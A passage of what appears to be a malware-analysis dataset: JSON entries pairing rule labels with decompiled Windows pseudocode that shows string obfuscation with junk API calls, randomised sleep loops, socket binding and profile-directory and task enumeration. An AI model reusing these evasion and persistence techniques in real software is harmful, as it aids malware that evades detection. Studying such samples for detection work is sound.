code_r0x00408788;\n            iVar5 = lpFindFileData;\n            iVar12 = lpBuffer;\n            for (uVar13 = 0; (uVar13 <= var_1ch || (uVar13 <= var_14h)); uVar13 = uVar13 + 1) {\n                if ((uVar13 == var_1ch) || (uVar13 == var_14h)) {\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar5 + 0x2c, 0, 0x2e);\n                    var_34h = (iVar7 + (-0x2c - iVar5) >> 1) >> 1;\n                    var_20h = 0;\n                    if ((var_4h != 0) && (var_20h = var_34h - 4,  var_34h < var_20h)) {\n                        var_20h = 0;\n                    }\n                    if (4 < var_34h) {\n                        var_34h = 4;\n                    }\n                    piVar6 = lpMem;\n                    do {\n                        iVar1 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != var_28h);\n                    for (piVar6 = lpMem + (piVar6 - (lpMem + 1) >> 1); *piVar6 != 0; piVar6 = piVar6 + 1) {\n                    }\n                    var_24h = iVar5 + (var_20h + 0x16) * 2;\n                    var_20h = *var_24h;\n                    if (*var_24h != 0) {\n                        iVar7 = var_24h - piVar6;\n                        uVar8 = var_20h;\n                        uVar10 = var_34h;\n                        do {\n                            iVar5 = lpFindFileData;\n                            iVar12 = lpBuffer;\n                            if (uVar10 == 0) break;\n                            *piVar6 = uVar8;\n                            piVar6 = piVar6 + 1;\n                            uVar10 = uVar10 - 1;\n                            uVar2 = *(iVar7 + piVar6);\n                            uVar8 = uVar2;\n                        } while (uVar2 != 0);\n                    }\n                    var_4h = var_4h + var_34h;\n                    *piVar6 = 0;\n                    var_2ch = var_34h;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_18h, iVar5);\n                if (iVar7 == 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, iVar5);\n                }\n            }\n            *arg_10h = lpMem;\n            var_20h = 1;\n            lpMem[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_18h);\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar6 = stack0xffffffc4;\n        }\n        uVar4 = (*pcVar11)(0, piVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar5 = lpFindFileData;\n    }\n    uVar4 = (*pcVar11)(0, lpBuffer);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\ncode_r0x004087b6:\n    uVar4 = (*pcVar11)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return var_20h;\n}\n",
        "token_count": 1992
    },
    "0040903e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040903e(void)\n\n{\n    ushort uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uchar *puStack476;\n    uint32_t uVar8;\n    uchar auStack408 [404];\n    \n    puStack476 = &stack0xfffffe68;\n    uVar7 = 0;\n    uStack480 = 0x202;\n    uStack484 = 0x40905f;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    uStack484 = 0;\n    uStack488 = 1;\n    uVar2 = (*_sym.imp.WS2_32.dll_socket)(2);\n    if (uVar2 != 0xffffffff) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar7 = iVar3 + 2000U & 0xffff;\n        uVar2 = 0;\n        if (uVar7 < 64000) {\n            uVar8 = 0x78635874;\n            puStack476 = 0x6e565376;\n            do {\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar6 = 0;\n                uVar7 = uVar8;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                    if (iVar5 != 0xf14bf1) {\n                        *(iVar6 + iVar3) = (&stack0xfffffe18)[iVar6 % 5] ^ (iVar6 + iVar3)[&stack0xfffffe20 + -iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 10);\n                (*_sym.imp.WS2_32.dll_inet_addr)(iVar3);\n                uVar1 = (*_sym.imp.WS2_32.dll_ntohs)(uVar7);\n                uVar8 = CONCAT22(uVar1, 2);\n                iVar6 = (*_sym.imp.WS2_32.dll_bind)(0x445f, &stack0xfffffe30, 0x10);\n                if (iVar6 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(0x445f);\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar7 = uVar7 + 1;\n                uVar2 = 0;\n            } while (uVar7 < 64000);\n        }\n    }\n    return uVar2 & 0xffff0000 | uVar7 & 0xffff;\n}\n",
        "token_count": 706
    },
    "0040e7aa": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e7aa(uint arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t unaff_ESI;\n    uchar *puVar5;\n    int32_t iVar6;\n    uint uStack20;\n    uchar auStack16 [12];\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_OutputDebugStringA;\n    uStack20 = *0x41db50;\n    puVar5 = auStack16;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    puVar5 = 0x41ddc8;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    (*pcVar1)(\"WMA 0\");\n    iVar4 = fcn.00409827();\n    if (iVar4 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41daa4);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar2 = fcn.0040fe03();\n    if (cVar2 != '\\0') {\n        iVar4 = fcn.0040eb15(0);\n        if (iVar4 != 0) {\n            (*pcVar1)(\"WMA 1\");\n            fcn.00409a4e();\n            (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41daa4);\n        }\n    }\n    fcn.0040ea40(&uStack20, 0, 0x1bb);\n    while (*0x41ddd0 == 0) {\n        iVar6 = 0;\n        iVar4 = fcn.0040e8d4();\n        if (iVar4 != -1) {\n            iVar3 = fcn.004087cd();\n            if ((iVar3 != iVar6) && (iVar6 != 0)) {\n                fcn.0040ea40(&stack0xffffffe0, iVar4, 0x50);\n            }\n        }\n        unaff_ESI = unaff_ESI * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(unaff_ESI % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 574
    },
    "0040e8d4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040e8d4(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_23h;\n    ushort var_1fh;\n    uchar var_1dh;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = -1;\n    var_8h = *0x41db50;\n    var_44h = 0x3e263a36;\n    var_40h = 0x2d3f3134;\n    var_3ch = 0x343c3b33;\n    var_38h = 0x273e3428;\n    var_34h = 0x25293729;\n    var_30h = 0x22322e22;\n    var_2ch = 0x68762d28;\n    var_4h = 5;\n    var_28h._0_1_ = 5;\n    stack0xffffffd5 = 0x716b6560;\n    var_23h = 0x6060676f;\n    var_1fh = 0x6a7c;\n    var_1dh = 0x51;\n    var_14h = 0x5a455857;\n    var_10h._0_1_ = 0x51;\n    var_1ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar5 != 0xf31995) {\n            pcVar4[iVar7] = *(&var_14h + iVar7 % var_4h) ^ (pcVar4 + iVar7)[&var_44h - pcVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x28);\n    iVar7 = 0;\n    pcVar8 = str.EFFDZ.;\n    do {\n        var_14h = 1;\n        var_4h = 0;\n        do {\n            if (pcVar8[iVar7] != '\\0') {\n                cVar2 = *pcVar4;\n                pcVar6 = pcVar4;\n                while (cVar2 != pcVar8[iVar7]) {\n                    if (cVar2 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x0040e9c5;\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    cVar2 = *pcVar6;\n                }\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < 0x20);\n        bVar1 = true;\ncode_r0x0040e9c5:\n        if (((*pcVar8 != '\\0') && (pcVar8[0x1f] == '\\0')) && (bVar1)) {\n            iVar5 = fcn.00407b28();\n            if (iVar5 != -1) {\n                *var_1ch = iVar5;\n                var_ch = iVar7;\n                break;\n            }\n            var_8h = var_8h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_8h % 600000 + 60000);\n        }\n        pcVar8 = pcVar8 + 0x20;\n        iVar7 = iVar7 + 1;\n    } while (pcVar8 < 0x413440);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return var_ch;\n}\n",
        "token_count": 1023
    },
    "0040ebee": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ebee(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int16_t *piVar9;\n    uint lpFileName;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *ppv;\n    int32_t var_10h;\n    int32_t pszFirst;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    var_30h = 0x73054110;\n    var_34h = 0;\n    var_20h = NULL;\n    ppv = NULL;\n    var_18h = NULL;\n    var_1ch = 0;\n    var_10h = 0;\n    var_2ch = 0x41564e28;\n    var_28h = 0x4e447345;\n    pszFirst = 0x73694174;\n    var_8h._0_2_ = 0x4e44;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = 0;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar6 != 0xf540e6) {\n            var_24h = 6;\n            *(iVar7 + piVar5) = *(&pszFirst + iVar7 % 6) ^ (iVar7 + piVar5)[&var_30h - piVar5];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    iVar7 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar7) {\n        iVar7 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x411370, 0, 1, 0x411380, &ppv);\n        if ((-1 < iVar7) && (ppv != NULL)) {\n            iVar7 = (**(*ppv + 0x14))(ppv, &var_20h);\n            if ((-1 < iVar7) && (var_20h != NULL)) {\n                iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                pcVar2 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar7 && (var_10h != 0))) {\n                    do {\n                        var_10h = var_10h + -1;\n                        uVar4 = *(var_1ch + var_10h * 4);\n                        var_24h = uVar4;\n                        iVar7 = (**(*ppv + 0x18))(ppv, uVar4, 0x411390, &var_18h);\n                        if ((-1 < iVar7) && (var_18h != NULL)) {\n                            pszFirst = 0;\n                            var_4h = NULL;\n                            iVar7 = (**(*var_18h + 0x84))(var_18h, &pszFirst);\n                            if ((-1 < iVar7) && (pszFirst != 0)) {\n                                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x41daac);\n                                if ((iVar7 != 0) &&\n                                   ((iVar7 = (**(*var_18h + 0x8c))(var_18h, &var_4h),  -1 < iVar7 && (var_4h != NULL))))\n                                {\n                                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_4h, piVar5);\n                                    piVar3 = var_4h;\n                                    if ((iVar7 != 0) &&\n                                       (((*var_4h == 0x22 && (var_4h[2] == 0x3a)) && (var_4h[3] == 0x5c)))) {\n                                        puVar8 = &lpFileName;\n                                        for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                            *puVar8 = 0;\n                                            puVar8 = puVar8 + 1;\n                                        }\n                                        piVar9 = piVar5;\n                                        do {\n                                            iVar1 = *piVar9;\n                                            piVar9 = piVar9 + 1;\n                                        } while (iVar1 != var_34h);\n                                        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(piVar3, piVar5);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_4h + 1, \n                                                   ((iVar7 - var_4h >> 1) - 2) + (piVar9 - (piVar5 + 1) >> 1));\n                                        iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        uVar4 = var_24h;\n                                        if (iVar7 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, var_24h);\n                                        }\n                                    }\n                                    (*pcVar2)(var_4h);\n                                }\n                                (*pcVar2)(pszFirst);\n                            }\n                            (**(*var_18h + 8))(var_18h);\n                        }\n                        (*pcVar2)(uVar4);\n                    } while (var_10h != 0);\n                    (*pcVar2)(var_1ch);\n                    iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                }\n                (**(*var_20h + 8))(var_20h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 1455
    },
    "0040f1d6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f1d6(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x41ddd0 = 1;\n    fcn.00408946(param_1);\n    fcn.0040ebee();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x41daac);\n    if (iVar1 != -1) {\n        fcn.00401000();\n    }\n    fcn.0040f247();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.0040fcbb();\n    return;\n}\n",
        "token_count": 138
    },
    "0040f247": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f247(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    uint lpcchSize;\n    int32_t var_64h;\n    uint ARG_0;\n    int32_t var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint lpFileName;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint lpProfileDir;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    lpFileName = (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    ARG_0 = (*pcVar5)(uVar2);\n    lpcchSize = 0x104;\n    var_28h = 0x6c37597f;\n    var_24h = 0x5952521a;\n    var_20h = 0x52596c34;\n    var_1ch = 0x6c3d5960;\n    var_18h = 0x5947520d;\n    var_14h = 0x52176c31;\n    var_10h = 0x6c2b5954;\n    var_ch = 0x59675225;\n    var_8h = 0x52146c3d;\n    var_4h = 0x6c585943;\n    var_30h = 0x6c585933;\n    var_2ch._0_2_ = 0x5279;\n    uVar2 = (*pcVar1)(8, 0x51);\n    iVar3 = (*pcVar5)(uVar2);\n    var_48h = 6;\n    iVar6 = 0;\n    var_64h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar4 != 0xf75fb5) {\n            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_48h) ^ (iVar6 + iVar3)[&var_28h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x28);\n    var_28h = 0x4831501b;\n    var_24h = 0x501e343c;\n    var_20h = 0x34384820;\n    var_1ch = 0x481d503b;\n    var_18h = 0x50353400;\n    var_14h = 0x342d4822;\n    var_10h = 0x481d5036;\n    var_ch = 0x503f3418;\n    var_8h = 0x343c482c;\n    var_4h = CONCAT22(var_4h._2_2_, 0x505a);\n    var_30h = 0x4841505a;\n    var_2ch._0_2_ = 0x344c;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    var_74h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    var_6ch = var_74h;\n    var_40h = &var_28h - var_74h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        uVar2 = lpProfileDir;\n        if (iVar6 != 0xcda5a7) {\n            *(iVar3 + var_74h) = *(&var_30h + iVar3 % var_48h) ^ (iVar3 + var_74h)[&var_28h - var_74h];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x26);\n    var_70h = var_64h;\n    iVar3 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        var_40h = iVar3;\n        while (iVar3 != -1) {\n            iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x411a64);\n            if ((iVar6 != 0) && (iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x411a68),  iVar6 != 0)) {\n                var_58h = 0;\n                var_54h = 0x76464a69;\n                var_50h._0_2_ = 0x7059;\n                var_38h = 0x766c4a35;\n                var_34h._0_2_ = 0x7059;\n                var_30h = 0x4c337a61;\n                var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x68);\n                do {\n                    uVar2 = (*pcVar5)(8, 0xd);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_5ch = iVar3;\n                    var_44h = &var_54h - iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                        uVar2 = lpFileName;\n                        if (iVar4 != 0xf25018) {\n                            *(iVar6 + iVar3) = *(&var_38h + iVar6 % var_48h) ^ (iVar6 + iVar3)[&var_54h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, lpProfileDir);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(uVar2, iVar3);\n                    var_14h = 0x4c407a44;\n                    var_10h = 0x335f6134;\n                    var_ch = 0x7a3d683f;\n                    var_8h = 0x611b4c16;\n                    var_4h = CONCAT22(var_4h._2_2_, 0x337a);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_44h = &var_14h - iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                        if (iVar4 != 0x7a45d7) {\n                            var_44h = 5;\n                            *(iVar6 + iVar3) = *(&var_30h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_14h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar3, lpProfileDir, &psz1, (&var_74h)[var_58h]);\n                    fcn.0040147b(1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    uVar2 = (*pcVar5)(0, var_5ch);\n                    (*pcVar1)(uVar2);\n                    var_58h = var_58h + 1;\n                    iVar3 = var_40h;\n                } while (var_58h < 2);\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar3, &lpFindFileData);\n            if (iVar6 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n                iVar3 = -1;\n                var_40h = -1;\n            }\n        }\n    }\n    var_24h = 0x63203744;\n    var_20h = 0x37126948;\n    var_1ch = 0x69546307;\n    var_18h = 0x6321370c;\n    var_14h = 0x370e695e;\n    var_10h = 0x69146307;\n    var_ch = 0x6327373d;\n    var_8h = 0x370c6954;\n    var_4h = 0x69316303;\n    var_38h = 0x63733761;\n    var_34h._0_2_ = 0x6931;\n    uVar2 = (*pcVar5)(8, 0x49);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_5ch = &var_24h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar4 != 0x814081) {\n            *(iVar6 + iVar3) = *(&var_38h + iVar6 % var_48h) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar3, lpProfileDir, 0x104);\n    fcn.0040147b(1);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, ARG_0);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, lpProfileDir);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_6ch);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, var_64h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return;\n}\n",
        "token_count": 2749
    },
    "0040f6b7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040f6b7(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    code *pcVar14;\n    int16_t *piVar15;\n    uint lpFindFileData;\n    uint lpString1;\n    uint *lpMem;\n    int32_t var_d4h;\n    int32_t var_d0h;\n    uint var_cch;\n    int32_t lpString2;\n    int32_t var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    int32_t hFindFile;\n    uchar *ARG_0;\n    int16_t *var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uchar *lpFileName;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t dwBytes;\n    \n    pcVar2 = _sym.imp.USERENV.dll_GetProfilesDirectoryW;\n    var_cch = 0;\n    ARG_0 = NULL;\n    dwBytes = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &dwBytes);\n    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (dwBytes != 0) {\n        dwBytes = dwBytes + 10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes * 2);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_60h = piVar4;\n        uVar3 = (*pcVar14)(8, dwBytes * 2);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(8, 0x208);\n            puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            puVar6 = &lpFindFileData;\n            ARG_0 = puVar5;\n            for (iVar10 = 0x250; piVar4 = var_60h,  iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = lpFileName;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            piVar15 = var_60h;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *piVar15 = 0;\n                piVar15 = piVar15 + 1;\n            }\n            iVar10 = (*pcVar2)(var_60h, &dwBytes);\n            if (iVar10 != 0) {\n                iVar10 = lpFileName - piVar4;\n                do {\n                    iVar1 = *piVar4;\n                    *(piVar4 + iVar10) = iVar1;\n                    piVar4 = piVar4 + 1;\n                } while (iVar1 != 0);\n                var_54h = 0x4619591a;\n                var_50h = 0x33734678;\n                var_4ch._0_2_ = 0x5646;\n                var_44h = 0x46335946;\n                var_40h._0_1_ = 0x56;\n                uVar3 = (*pcVar14)(8, 0x15);\n                puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                var_c4h = 5;\n                iVar10 = 0;\n                lpMem = puVar6;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_GetCapture)();\n                    if (iVar7 != 0xf5ec8d) {\n                        *(iVar10 + puVar6) = *(&var_44h + iVar10 % var_c4h) ^ (iVar10 + puVar6)[&var_54h - puVar6];\n                    }\n                    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    iVar10 = iVar10 + 1;\n                    puVar12 = puVar6;\n                } while (iVar10 < 10);\n                do {\n                    iVar1 = *puVar12;\n                    puVar12 = puVar12 + 2;\n                } while (iVar1 != 0);\n                uVar13 = puVar12 - puVar6;\n                